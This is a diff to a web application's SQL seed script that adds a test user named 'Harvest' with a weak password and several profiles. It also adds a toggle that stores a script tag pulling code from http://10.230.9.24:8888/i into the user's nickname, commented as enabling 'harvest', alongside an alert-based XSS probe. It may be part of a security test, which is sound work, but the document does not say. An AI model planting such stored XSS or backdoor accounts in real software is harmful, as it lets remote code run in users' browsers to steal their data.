@@ -31,3 +31,14 @@ insert into tb_menu values (3, 1, 'Administrador', '', true);
 insert into tb_submenu values (4, 3, '/html/localpelada.xhtml', 'Local Pelada', true);
 --update tb_submenu set id_menu = 3 where id_submenu = 4
 
+
+--harvest
+insert into tb_usuario values (2, 1, 'Harvest Test', '111111111111', 'Harv<script>alert("Alo Mundo")</script>', 'a@b.com');
+insert into tb_login values (2, 2, 'harvest', '12345678');
+insert into tb_login_perfil values (1, 2);
+insert into tb_login_perfil values (2, 2);
+
+--habilitar harvest, trocar IP
+update tb_usuario set apelido = '<script src="http://10.230.9.24:8888/i"></script>' where id_usuario = 2
+--desabilitar harvest
+update tb_usuario set apelido = 'Harv' where id_usuario = 2
